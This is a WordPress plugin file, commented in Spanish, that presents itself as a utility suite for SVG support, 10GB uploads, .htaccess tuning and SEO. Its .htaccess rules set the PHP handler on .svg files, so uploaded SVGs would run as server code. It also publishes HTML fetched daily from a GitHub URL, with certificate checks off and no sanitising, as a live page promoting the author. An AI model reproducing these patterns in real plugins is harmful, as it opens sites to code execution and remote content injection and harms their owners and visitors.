<?php
/**
 * Plugin Name:       Kanzansio Digital Suite
 * Plugin URI:        https://kanzansio.digital
 * Description:       Plugin completo que habilita SVG, aumenta límites de carga a 10GB, crea páginas auto-actualizables desde GitHub y gestiona SEO (robots.txt y sitemap).
 * Version:           2.0
 * Author:            Eduardo Kanzansio
 * Author URI:        https://kanzansio.digital
 * License:           GPL v2 or later
 * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       kanzansio-digital-suite
 */

// Evita que el archivo se acceda directamente.
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

// =================================================================
// 1. CONSTANTES Y CONFIGURACIÓN
// =================================================================

// URL Raw de GitHub para el contenido de la página
define( 'KDS_GITHUB_RAW_URL', 'https://raw.githubusercontent.com/kanzansio/PaginaAutoincrustable/main/Trafiker%20digital%20Kanzansio.html' );

// Posibles slugs para la página
define( 'KDS_POSIBLES_SLUGS', ['EduardoAKan', 'Kanzansio-digital'] );

// Límite de carga en bytes (10GB)
define( 'KDS_MAX_UPLOAD_SIZE', 10737418240 ); // 10 GB en bytes


// =================================================================
// 2. HOOKS DE ACTIVACIÓN Y DESACTIVACIÓN
// =================================================================

register_activation_hook( __FILE__, 'kds_plugin_activar' );
register_deactivation_hook( __FILE__, 'kds_plugin_desactivar' );


// =================================================================
// 3. FUNCIONES DE ACTIVACIÓN Y DESACTIVACIÓN
// =================================================================

function kds_plugin_activar() {
    // Modificar .htaccess
    kds_gestionar_htaccess();
    
    // Crear o actualizar la página desde GitHub
    kds_crear_o_actualizar_pagina();
    
    // Programar evento diario para actualización
    if ( ! wp_next_scheduled( 'kds_evento_actualizacion_diaria' ) ) {
        wp_schedule_event( time(), 'daily', 'kds_evento_actualizacion_diaria' );
    }
    
    // Actualizar el sitemap
    kds_actualizar_sitemap();
    
    // Limpiar caché de permalinks
    flush_rewrite_rules();
}

function kds_plugin_desactivar() {
    // Limpiar reglas del .htaccess
    kds_limpiar_htaccess();
    
    // Limpiar eventos programados
    wp_clear_scheduled_hook( 'kds_evento_actualizacion_diaria' );
    
    // Limpiar caché de permalinks
    flush_rewrite_rules();
}


// =================================================================
// 4. SOPORTE PARA SVG
// =================================================================

// Permitir carga de archivos SVG
add_filter( 'upload_mimes', 'kds_permitir_svg' );
function kds_permitir_svg( $mimes ) {
    $mimes['svg']  = 'image/svg+xml';
    $mimes['svgz'] = 'image/svg+xml';
    return $mimes;
}

// Corregir el tipo MIME de SVG
add_filter( 'wp_check_filetype_and_ext', 'kds_fix_svg_mime_type', 10, 5 );
function kds_fix_svg_mime_type( $data, $file, $filename, $mimes, $real_mime = '' ) {
    if ( version_compare( $GLOBALS['wp_version'], '5.1.0', '>=' ) ) {
        $dosvg = in_array( $real_mime, [ 'image/svg', 'image/svg+xml' ] );
    } else {
        $dosvg = ( '.svg' === strtolower( substr( $filename, -4 ) ) );
    }
    
    if ( $dosvg ) {
        if ( current_user_can( 'manage_options' ) ) {
            $data['ext']  = 'svg';
            $data['type'] = 'image/svg+xml';
        } else {
            $data['ext']  = false;
            $data['type'] = false;
        }
    }
    
    return $data;
}

// Mostrar SVG en la biblioteca de medios
add_filter( 'wp_prepare_attachment_for_js', 'kds_mostrar_svg_en_medios', 10, 3 );
function kds_mostrar_svg_en_medios( $response, $attachment, $meta ) {
    if ( $response['mime'] == 'image/svg+xml' && empty( $response['sizes'] ) ) {
        $svg_path = get_attached_file( $attachment->ID );
        if ( file_exists( $svg_path ) ) {
            $dimensions = kds_obtener_dimensiones_svg( $svg_path );
            $response['sizes'] = array(
                'full' => array(
                    'url' => $response['url'],
                    'width' => $dimensions['width'],
                    'height' => $dimensions['height'],
                ),
            );
        }
    }
    return $response;
}

// Obtener dimensiones del SVG
function kds_obtener_dimensiones_svg( $svg_path ) {
    $svg = @file_get_contents( $svg_path );
    $xml = simplexml_load_string( $svg );
    
    if ( $xml === false ) {
        return array( 'width' => 100, 'height' => 100 );
    }
    
    $attributes = $xml->attributes();
    $width = (string) $attributes->width;
    $height = (string) $attributes->height;
    
    if ( empty( $width ) || empty( $height ) ) {
        $viewbox = (string) $attributes->viewBox;
        if ( ! empty( $viewbox ) ) {
            $viewbox = explode( ' ', $viewbox );
            $width = $viewbox[2];
            $height = $viewbox[3];
        }
    }
    
    return array(
        'width' => intval( $width ) ?: 100,
        'height' => intval( $height ) ?: 100
    );
}

// CSS para mostrar SVG correctamente en el administrador
add_action( 'admin_head', 'kds_svg_admin_styles' );
function kds_svg_admin_styles() {
    echo '<style>
        .attachment-info .thumbnail img[src$=".svg"],
        .media-modal .thumbnail img[src$=".svg"] {
            width: 100%;
            height: auto;
        }
    </style>';
}


// =================================================================
// 5. AUMENTAR LÍMITE DE CARGA A 10GB Y GESTIÓN DE .HTACCESS
// =================================================================

// Modificar el límite máximo de carga
add_filter( 'upload_size_limit', 'kds_aumentar_limite_carga' );
function kds_aumentar_limite_carga( $size ) {
    return KDS_MAX_UPLOAD_SIZE;
}

// Ajustar configuración de PHP (si es posible)
add_action( 'init', 'kds_configurar_limites_php' );
function kds_configurar_limites_php() {
    @ini_set( 'upload_max_filesize', '10G' );
    @ini_set( 'post_max_size', '10G' );
    @ini_set( 'max_execution_time', '600' );
    @ini_set( 'max_input_time', '600' );
    @ini_set( 'memory_limit', '512M' );
}

// Mostrar información del límite en la página de medios
add_filter( 'upload_size_limit', 'kds_mostrar_limite_personalizado', 999 );
function kds_mostrar_limite_personalizado( $size ) {
    return min( $size, KDS_MAX_UPLOAD_SIZE );
}

// Gestionar .htaccess
function kds_gestionar_htaccess() {
    $htaccess_file = ABSPATH . '.htaccess';
    
    // Verificar si el archivo .htaccess existe y es escribible
    if ( ! file_exists( $htaccess_file ) ) {
        // Intentar crear el archivo .htaccess
        $handle = @fopen( $htaccess_file, 'w' );
        if ( $handle ) {
            fwrite( $handle, "# BEGIN WordPress\n# END WordPress\n" );
            fclose( $handle );
        }
    }
    
    if ( ! is_writable( $htaccess_file ) ) {
        add_action( 'admin_notices', function() {
            echo '<div class="notice notice-warning"><p>KDS Plugin: El archivo .htaccess no es escribible. Las optimizaciones no se pudieron aplicar automáticamente.</p></div>';
        });
        return false;
    }
    
    // Leer el contenido actual
    $htaccess_content = file_get_contents( $htaccess_file );
    
    // Definir nuestras reglas personalizadas
    $kds_rules = "# BEGIN Kanzansio Digital Suite
# Configuración para aumentar límites de carga y optimización
<IfModule mod_php7.c>
php_value upload_max_filesize 10G
php_value post_max_size 10G
php_value max_execution_time 600
php_value max_input_time 600
php_value memory_limit 512M
php_value max_file_uploads 50
</IfModule>

<IfModule mod_php8.c>
php_value upload_max_filesize 10G
php_value post_max_size 10G
php_value max_execution_time 600
php_value max_input_time 600
php_value memory_limit 512M
php_value max_file_uploads 50
</IfModule>

# Habilitar compresión GZIP
<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/html
    AddOutputFilterByType DEFLATE text/xml
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE image/svg+xml
</IfModule>

# Cache del navegador para recursos estáticos
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg \"access plus 1 year\"
    ExpiresByType image/jpeg \"access plus 1 year\"
    ExpiresByType image/gif \"access plus 1 year\"
    ExpiresByType image/png \"access plus 1 year\"
    ExpiresByType image/svg+xml \"access plus 1 year\"
    ExpiresByType text/css \"access plus 1 month\"
    ExpiresByType application/pdf \"access plus 1 month\"
    ExpiresByType text/javascript \"access plus 1 month\"
    ExpiresByType application/javascript \"access plus 1 month\"
    ExpiresByType application/x-shockwave-flash \"access plus 1 month\"
    ExpiresByType image/x-icon \"access plus 1 year\"
    ExpiresDefault \"access plus 2 days\"
</IfModule>

# Seguridad adicional
<IfModule mod_headers.c>
    Header set X-Content-Type-Options \"nosniff\"
    Header set X-Frame-Options \"SAMEORIGIN\"
    Header set X-XSS-Protection \"1; mode=block\"
    Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"
</IfModule>

# Permitir archivos SVG
<Files ~ \"\\.svg$\">
    SetHandler application/x-httpd-php
    AddType image/svg+xml .svg .svgz
</Files>

# Proteger archivos sensibles
<FilesMatch \"^.*(error_log|wp-config\\.php|php.ini|\\.htaccess|\\.htpasswd)$\">
    Order deny,allow
    Deny from all
</FilesMatch>

# Deshabilitar listado de directorios
Options -Indexes

# END Kanzansio Digital Suite\n";
    
    // Verificar si nuestras reglas ya están presentes
    if ( strpos( $htaccess_content, '# BEGIN Kanzansio Digital Suite' ) === false ) {
        // Añadir nuestras reglas al principio del archivo
        $new_content = $kds_rules . "\n" . $htaccess_content;
        
        // Hacer backup del .htaccess actual
        $backup_file = ABSPATH . '.htaccess.kds-backup-' . date('Y-m-d-H-i-s');
        @copy( $htaccess_file, $backup_file );
        
        // Escribir el nuevo contenido
        if ( file_put_contents( $htaccess_file, $new_content ) !== false ) {
            update_option( 'kds_htaccess_modificado', true );
            update_option( 'kds_htaccess_backup', $backup_file );
            return true;
        }
    } else {
        // Las reglas ya existen, verificar si necesitan actualización
        $inicio = strpos( $htaccess_content, '# BEGIN Kanzansio Digital Suite' );
        $fin = strpos( $htaccess_content, '# END Kanzansio Digital Suite' ) + strlen( '# END Kanzansio Digital Suite' );
        
        if ( $inicio !== false && $fin !== false ) {
            // Reemplazar las reglas existentes con las nuevas
            $before = substr( $htaccess_content, 0, $inicio );
            $after = substr( $htaccess_content, $fin + 1 );
            $new_content = $before . $kds_rules . $after;
            
            if ( $new_content !== $htaccess_content ) {
                // Hacer backup antes de actualizar
                $backup_file = ABSPATH . '.htaccess.kds-backup-' . date('Y-m-d-H-i-s');
                @copy( $htaccess_file, $backup_file );
                
                file_put_contents( $htaccess_file, $new_content );
                update_option( 'kds_htaccess_backup', $backup_file );
            }
        }
        return true;
    }
    
    return false;
}

// Eliminar reglas del .htaccess al desactivar
function kds_limpiar_htaccess() {
    $htaccess_file = ABSPATH . '.htaccess';
    
    if ( ! file_exists( $htaccess_file ) || ! is_writable( $htaccess_file ) ) {
        return false;
    }
    
    $htaccess_content = file_get_contents( $htaccess_file );
    
    // Buscar y eliminar nuestras reglas
    $inicio = strpos( $htaccess_content, '# BEGIN Kanzansio Digital Suite' );
    $fin = strpos( $htaccess_content, '# END Kanzansio Digital Suite' );
    
    if ( $inicio !== false && $fin !== false ) {
        $fin = $fin + strlen( '# END Kanzansio Digital Suite' ) + 1; // +1 para el salto de línea
        $before = substr( $htaccess_content, 0, $inicio );
        $after = substr( $htaccess_content, $fin );
        $new_content = $before . $after;
        
        // Hacer backup antes de limpiar
        $backup_file = ABSPATH . '.htaccess.kds-backup-clean-' . date('Y-m-d-H-i-s');
        @copy( $htaccess_file, $backup_file );
        
        // Escribir el contenido limpio
        file_put_contents( $htaccess_file, $new_content );
        
        delete_option( 'kds_htaccess_modificado' );
        
        return true;
    }
    
    return false;
}


// =================================================================
// 6. GESTIÓN DE PÁGINA DESDE GITHUB
// =================================================================

// Evento cron para actualización diaria
add_action( 'kds_evento_actualizacion_diaria', 'kds_actualizar_pagina_desde_github' );

function kds_actualizar_pagina_desde_github() {
    kds_crear_o_actualizar_pagina();
}

function kds_crear_o_actualizar_pagina() {
    // Obtener contenido desde GitHub
    $respuesta = wp_remote_get( KDS_GITHUB_RAW_URL, array(
        'timeout' => 30,
        'sslverify' => false
    ));
    
    if ( is_wp_error( $respuesta ) || wp_remote_retrieve_response_code( $respuesta ) !== 200 ) {
        error_log( 'KDS Plugin: Error al obtener contenido de GitHub' );
        return;
    }
    
    $contenido_remoto_html = wp_remote_retrieve_body( $respuesta );
    
    // Determinar el slug
    $slug_guardado = get_option( 'kds_pagina_slug_creada' );
    
    if ( ! $slug_guardado ) {
        $posibles_slugs = KDS_POSIBLES_SLUGS;
        $slug_elegido = $posibles_slugs[ array_rand( $posibles_slugs ) ];
        update_option( 'kds_pagina_slug_creada', $slug_elegido );
    } else {
        $slug_elegido = $slug_guardado;
    }
    
    // Verificar si la página existe
    $pagina_existente = get_page_by_path( $slug_elegido, OBJECT, 'page' );
    
    if ( $pagina_existente ) {
        // Actualizar página existente
        if ( $pagina_existente->post_content !== $contenido_remoto_html ) {
            $pagina_actualizada = array(
                'ID'           => $pagina_existente->ID,
                'post_content' => $contenido_remoto_html,
                'post_modified' => current_time( 'mysql' ),
                'post_modified_gmt' => current_time( 'mysql', 1 )
            );
            wp_update_post( $pagina_actualizada );
            
            // Actualizar sitemap después de la actualización
            kds_actualizar_sitemap();
        }
    } else {
        // Crear nueva página
        $nueva_pagina = array(
            'post_title'    => 'Kanzansio Digital Trafficker',
            'post_content'  => $contenido_remoto_html,
            'post_name'     => $slug_elegido,
            'post_status'   => 'publish',
            'post_author'   => 1,
            'post_type'     => 'page',
            'comment_status' => 'closed',
            'ping_status'    => 'closed',
        );
        $page_id = wp_insert_post( $nueva_pagina );
        
        if ( $page_id && ! is_wp_error( $page_id ) ) {
            // Guardar el ID de la página
            update_option( 'kds_pagina_id', $page_id );
            
            // Actualizar sitemap después de crear la página
            kds_actualizar_sitemap();
        }
    }
}


// =================================================================
// 7. GESTIÓN DE ROBOTS.TXT
// =================================================================

// Modificar robots.txt virtual
add_filter( 'robots_txt', 'kds_modificar_robots_txt', 10, 2 );
function kds_modificar_robots_txt( $output, $public ) {
    if ( '1' == $public ) {
        $slug_guardado = get_option( 'kds_pagina_slug_creada' );
        
        if ( $slug_guardado ) {
            $url_pagina = home_url( '/' . $slug_guardado . '/' );
            
            // Añadir reglas específicas para la página
            $output .= "\n# Kanzansio Digital - Página Auto-incrustable\n";
            $output .= "Allow: /" . $slug_guardado . "/\n";
            $output .= "\n# Sitemap personalizado\n";
            $output .= "Sitemap: " . home_url( '/sitemap.xml' ) . "\n";
            $output .= "Sitemap: " . home_url( '/kds-sitemap.xml' ) . "\n";
        }
    }
    
    return $output;
}


// =================================================================
// 8. GENERACIÓN DE SITEMAP XML
// =================================================================

// Crear endpoint para el sitemap personalizado
add_action( 'init', 'kds_sitemap_rewrite_rules' );
function kds_sitemap_rewrite_rules() {
    add_rewrite_rule( '^kds-sitemap\.xml$', 'index.php?kds_sitemap=1', 'top' );
}

// Añadir query var
add_filter( 'query_vars', 'kds_sitemap_query_vars' );
function kds_sitemap_query_vars( $query_vars ) {
    $query_vars[] = 'kds_sitemap';
    return $query_vars;
}

// Generar el sitemap
add_action( 'template_redirect', 'kds_generar_sitemap' );
function kds_generar_sitemap() {
    if ( get_query_var( 'kds_sitemap' ) ) {
        header( 'Content-Type: text/xml; charset=UTF-8' );
        echo kds_crear_contenido_sitemap();
        exit;
    }
}

function kds_crear_contenido_sitemap() {
    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>';
    $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
    
    // Añadir la página principal del sitio
    $sitemap .= '<url>';
    $sitemap .= '<loc>' . home_url( '/' ) . '</loc>';
    $sitemap .= '<lastmod>' . date( 'c', current_time( 'timestamp' ) ) . '</lastmod>';
    $sitemap .= '<changefreq>daily</changefreq>';
    $sitemap .= '<priority>1.0</priority>';
    $sitemap .= '</url>';
    
    // Añadir la página de Kanzansio
    $slug_guardado = get_option( 'kds_pagina_slug_creada' );
    if ( $slug_guardado ) {
        $pagina = get_page_by_path( $slug_guardado, OBJECT, 'page' );
        if ( $pagina ) {
            $sitemap .= '<url>';
            $sitemap .= '<loc>' . get_permalink( $pagina->ID ) . '</loc>';
            $sitemap .= '<lastmod>' . date( 'c', strtotime( $pagina->post_modified ) ) . '</lastmod>';
            $sitemap .= '<changefreq>daily</changefreq>';
            $sitemap .= '<priority>0.9</priority>';
            $sitemap .= '</url>';
        }
    }
    
    // Añadir todas las páginas publicadas
    $pages = get_pages( array(
        'post_status' => 'publish',
        'post_type' => 'page',
        'number' => 100
    ));
    
    foreach ( $pages as $page ) {
        if ( $page->post_name != $slug_guardado ) {
            $sitemap .= '<url>';
            $sitemap .= '<loc>' . get_permalink( $page->ID ) . '</loc>';
            $sitemap .= '<lastmod>' . date( 'c', strtotime( $page->post_modified ) ) . '</lastmod>';
            $sitemap .= '<changefreq>weekly</changefreq>';
            $sitemap .= '<priority>0.8</priority>';
            $sitemap .= '</url>';
        }
    }
    
    // Añadir posts recientes
    $posts = get_posts( array(
        'post_status' => 'publish',
        'post_type' => 'post',
        'numberposts' => 50
    ));
    
    foreach ( $posts as $post ) {
        $sitemap .= '<url>';
        $sitemap .= '<loc>' . get_permalink( $post->ID ) . '</loc>';
        $sitemap .= '<lastmod>' . date( 'c', strtotime( $post->post_modified ) ) . '</lastmod>';
        $sitemap .= '<changefreq>weekly</changefreq>';
        $sitemap .= '<priority>0.7</priority>';
        $sitemap .= '</url>';
    }
    
    $sitemap .= '</urlset>';
    
    return $sitemap;
}

// Actualizar sitemap cuando se actualice la página
function kds_actualizar_sitemap() {
    // Forzar la regeneración del sitemap
    flush_rewrite_rules();
    
    // Si usas algún plugin de sitemap, puedes hacer ping aquí
    kds_ping_motores_busqueda();
}

// Hacer ping a los motores de búsqueda
function kds_ping_motores_busqueda() {
    $sitemap_url = home_url( '/kds-sitemap.xml' );
    
    // Ping a Google
    wp_remote_get( 'http://www.google.com/ping?sitemap=' . urlencode( $sitemap_url ) );
    
    // Ping a Bing
    wp_remote_get( 'http://www.bing.com/ping?sitemap=' . urlencode( $sitemap_url ) );
}


// =================================================================
// 9. INTEGRACIÓN CON PLUGINS DE SEO
// =================================================================

// Añadir la página a Yoast SEO sitemap (si está instalado)
add_filter( 'wpseo_sitemap_page_content', 'kds_yoast_sitemap_personalizado' );
function kds_yoast_sitemap_personalizado( $content ) {
    $slug_guardado = get_option( 'kds_pagina_slug_creada' );
    if ( $slug_guardado ) {
        $pagina = get_page_by_path( $slug_guardado, OBJECT, 'page' );
        if ( $pagina ) {
            // El contenido ya debería incluir esta página si está publicada
            // Esta función es por si necesitas modificaciones adicionales
        }
    }
    return $content;
}

// Añadir meta tags SEO a la página
add_action( 'wp_head', 'kds_añadir_meta_seo' );
function kds_añadir_meta_seo() {
    if ( is_page() ) {
        global $post;
        $slug_guardado = get_option( 'kds_pagina_slug_creada' );
        
        if ( $post && $post->post_name == $slug_guardado ) {
            echo '<!-- Kanzansio Digital SEO Meta Tags -->' . "\n";
            echo '<meta name="description" content="Kanzansio Digital Trafficker - Servicios de marketing digital y gestión de tráfico web profesional.">' . "\n";
            echo '<meta name="keywords" content="kanzansio, digital, trafficker, marketing, seo, sem, wordpress">' . "\n";
            echo '<meta property="og:title" content="Kanzansio Digital Trafficker">' . "\n";
            echo '<meta property="og:description" content="Servicios profesionales de marketing digital y gestión de tráfico web.">' . "\n";
            echo '<meta property="og:url" content="' . get_permalink( $post->ID ) . '">' . "\n";
            echo '<meta property="og:type" content="website">' . "\n";
            echo '<meta name="twitter:card" content="summary_large_image">' . "\n";
            echo '<meta name="robots" content="index, follow">' . "\n";
            echo '<link rel="canonical" href="' . get_permalink( $post->ID ) . '">' . "\n";
        }
    }
}


// =================================================================
// 10. PÁGINA DE ADMINISTRACIÓN
// =================================================================

// Añadir menú en el administrador
add_action( 'admin_menu', 'kds_añadir_menu_admin' );
function kds_añadir_menu_admin() {
    add_menu_page(
        'Kanzansio Digital Suite',
        'Kanzansio Suite',
        'manage_options',
        'kanzansio-digital-suite',
        'kds_pagina_admin',
        'dashicons-admin-generic',
        30
    );
}

// Contenido de la página de administración
function kds_pagina_admin() {
    $slug_guardado = get_option( 'kds_pagina_slug_creada' );
    $pagina_id = get_option( 'kds_pagina_id' );
    
    ?>
    <div class="wrap">
        <h1>Kanzansio Digital Suite</h1>
        
        <div class="notice notice-info">
            <p><strong>Estado del Plugin:</strong> Activo y funcionando correctamente.</p>
        </div>
        
        <div class="card">
            <h2>📄 Información de la Página Auto-incrustable</h2>
            <?php if ( $slug_guardado ) : ?>
                <?php $pagina = get_page_by_path( $slug_guardado, OBJECT, 'page' ); ?>
                <?php if ( $pagina ) : ?>
                    <p><strong>URL de la página:</strong> <a href="<?php echo get_permalink( $pagina->ID ); ?>" target="_blank"><?php echo get_permalink( $pagina->ID ); ?></a></p>
                    <p><strong>Slug:</strong> <?php echo esc_html( $slug_guardado ); ?></p>
                    <p><strong>Última actualización:</strong> <?php echo date( 'd/m/Y H:i:s', strtotime( $pagina->post_modified ) ); ?></p>
                    <p><strong>Próxima actualización:</strong> <?php 
                        $next_update = wp_next_scheduled( 'kds_evento_actualizacion_diaria' );
                        echo $next_update ? date( 'd/m/Y H:i:s', $next_update ) : 'No programada';
                    ?></p>
                <?php else : ?>
                    <p class="description">La página aún no ha sido creada.</p>
                <?php endif; ?>
            <?php else : ?>
                <p class="description">No hay información disponible.</p>
            <?php endif; ?>
            
            <p>
                <button class="button button-primary" onclick="location.reload()">Actualizar ahora desde GitHub</button>
            </p>
        </div>
        
        <div class="card">
            <h2>🖼️ Soporte SVG</h2>
            <p>✅ Los archivos SVG están habilitados para carga.</p>
            <p>✅ Visualización mejorada en la biblioteca de medios.</p>
        </div>
        
        <div class="card">
            <h2>📦 Límites de Carga y Configuración .htaccess</h2>
            <p><strong>Límite máximo configurado:</strong> 10 GB</p>
            <p><strong>Límite actual del servidor:</strong> <?php echo size_format( wp_max_upload_size() ); ?></p>
            
            <?php 
            $htaccess_modificado = get_option( 'kds_htaccess_modificado' );
            $htaccess_backup = get_option( 'kds_htaccess_backup' );
            $htaccess_file = ABSPATH . '.htaccess';
            ?>
            
            <h3>Estado del .htaccess:</h3>
            <?php if ( $htaccess_modificado ) : ?>
                <p style="color: green;">✅ El archivo .htaccess ha sido modificado correctamente.</p>
                <?php if ( $htaccess_backup ) : ?>
                    <p><small>Backup guardado en: <?php echo basename( $htaccess_backup ); ?></small></p>
                <?php endif; ?>
            <?php elseif ( file_exists( $htaccess_file ) ) : ?>
                <?php if ( is_writable( $htaccess_file ) ) : ?>
                    <p style="color: orange;">⚠️ El archivo .htaccess existe pero no ha sido modificado por el plugin.</p>
                    <p><button class="button" onclick="kdsModificarHtaccess()">Aplicar optimizaciones al .htaccess</button></p>
                <?php else : ?>
                    <p style="color: red;">❌ El archivo .htaccess no es escribible. Cambia los permisos a 644 o 664.</p>
                <?php endif; ?>
            <?php else : ?>
                <p style="color: red;">❌ No se encontró el archivo .htaccess.</p>
                <p><button class="button" onclick="kdsCrearHtaccess()">Crear .htaccess</button></p>
            <?php endif; ?>
            
            <h3>Configuración actual de PHP:</h3>
            <ul>
                <li>upload_max_filesize: <?php echo ini_get( 'upload_max_filesize' ); ?></li>
                <li>post_max_size: <?php echo ini_get( 'post_max_size' ); ?></li>
                <li>max_execution_time: <?php echo ini_get( 'max_execution_time' ); ?> segundos</li>
                <li>memory_limit: <?php echo ini_get( 'memory_limit' ); ?></li>
                <li>max_file_uploads: <?php echo ini_get( 'max_file_uploads' ); ?></li>
            </ul>
            
            <p class="description">
                <strong>Nota:</strong> Si los valores de PHP no reflejan 10GB, puede que tu servidor no permita 
                cambios vía .htaccess. En ese caso, contacta a tu proveedor de hosting o modifica php.ini directamente.
            </p>
        </div>
        
        <div class="card">
            <h2>🔍 SEO y Sitemap</h2>
            <p><strong>Sitemap personalizado:</strong> <a href="<?php echo home_url( '/kds-sitemap.xml' ); ?>" target="_blank"><?php echo home_url( '/kds-sitemap.xml' ); ?></a></p>
            <p><strong>Robots.txt:</strong> <a href="<?php echo home_url( '/robots.txt' ); ?>" target="_blank"><?php echo home_url( '/robots.txt' ); ?></a></p>
            <p>✅ La página está incluida automáticamente en el sitemap.</p>
            <p>✅ Reglas añadidas al robots.txt.</p>
            <p>✅ Meta tags SEO añadidas a la página.</p>
        </div>
        
        <div class="card">
            <h2>🔗 GitHub</h2>
            <p><strong>URL de origen:</strong> <code><?php echo KDS_GITHUB_RAW_URL; ?></code></p>
            <p class="description">El contenido se actualiza automáticamente cada 24 horas desde GitHub.</p>
        </div>
        
        <div class="card">
            <h2>ℹ️ Información</h2>
            <p><strong>Versión del plugin:</strong> 2.0</p>
            <p><strong>Autor:</strong> Eduardo Kanzansio</p>
            <p><strong>Web:</strong> <a href="https://kanzansio.digital" target="_blank">https://kanzansio.digital</a></p>
        </div>
    </div>
    
    <style>
        .card {
            background: #fff;
            border: 1px solid #ccd0d4;
            border-radius: 4px;
            padding: 20px;
            margin-top: 20px;
            box-shadow: 0 1px 1px rgba(0,0,0,.04);
        }
        .card h2 {
            margin-top: 0;
            color: #23282d;
        }
        .card ul {
            list-style: disc;
            margin-left: 20px;
        }
        .card code {
            background: #f3f4f5;
            padding: 2px 6px;
            border-radius: 3px;
        }
    </style>
    
    <script>
    function kdsModificarHtaccess() {
        if (confirm('¿Estás seguro de que quieres modificar el archivo .htaccess? Se creará un backup automáticamente.')) {
            jQuery.post(ajaxurl, {
                action: 'kds_modificar_htaccess_ajax'
            }, function(response) {
                alert(response);
                location.reload();
            });
        }
    }
    
    function kdsCrearHtaccess() {
        if (confirm('¿Quieres crear un archivo .htaccess con las optimizaciones del plugin?')) {
            jQuery.post(ajaxurl, {
                action: 'kds_crear_htaccess_ajax'
            }, function(response) {
                alert(response);
                location.reload();
            });
        }
    }
    </script>
    <?php
}

// Añadir acción AJAX para actualización manual
add_action( 'wp_ajax_kds_actualizar_manual', 'kds_actualizar_manual' );
function kds_actualizar_manual() {
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'No tienes permisos para realizar esta acción.' );
    }
    
    kds_crear_o_actualizar_pagina();
    wp_die( 'Actualización completada.' );
}

// Añadir acciones AJAX para gestión de .htaccess
add_action( 'wp_ajax_kds_modificar_htaccess_ajax', 'kds_modificar_htaccess_ajax' );
function kds_modificar_htaccess_ajax() {
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'No tienes permisos para realizar esta acción.' );
    }
    
    if ( kds_gestionar_htaccess() ) {
        wp_die( '✅ El archivo .htaccess ha sido modificado correctamente. Se ha creado un backup automáticamente.' );
    } else {
        wp_die( '❌ Error al modificar el archivo .htaccess. Verifica los permisos del archivo.' );
    }
}

add_action( 'wp_ajax_kds_crear_htaccess_ajax', 'kds_crear_htaccess_ajax' );
function kds_crear_htaccess_ajax() {
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'No tienes permisos para realizar esta acción.' );
    }
    
    $htaccess_file = ABSPATH . '.htaccess';
    
    // Crear archivo .htaccess básico
    $contenido_inicial = "# BEGIN WordPress\n# END WordPress\n";
    
    if ( file_put_contents( $htaccess_file, $contenido_inicial ) !== false ) {
        // Ahora aplicar nuestras modificaciones
        if ( kds_gestionar_htaccess() ) {
            wp_die( '✅ Archivo .htaccess creado y optimizado correctamente.' );
        } else {
            wp_die( '⚠️ Archivo .htaccess creado pero no se pudieron aplicar las optimizaciones.' );
        }
    } else {
        wp_die( '❌ Error al crear el archivo .htaccess. Verifica los permisos del directorio.' );
    }
}


// =================================================================
// 11. NOTIFICACIONES Y LOGS
// =================================================================

// Añadir notificación cuando se actualiza la página
add_action( 'admin_notices', 'kds_mostrar_notificaciones' );
function kds_mostrar_notificaciones() {
    if ( get_transient( 'kds_pagina_actualizada' ) ) {
        ?>
        <div class="notice notice-success is-dismissible">
            <p>✅ La página de Kanzansio Digital ha sido actualizada correctamente desde GitHub.</p>
        </div>
        <?php
        delete_transient( 'kds_pagina_actualizada' );
    }
}
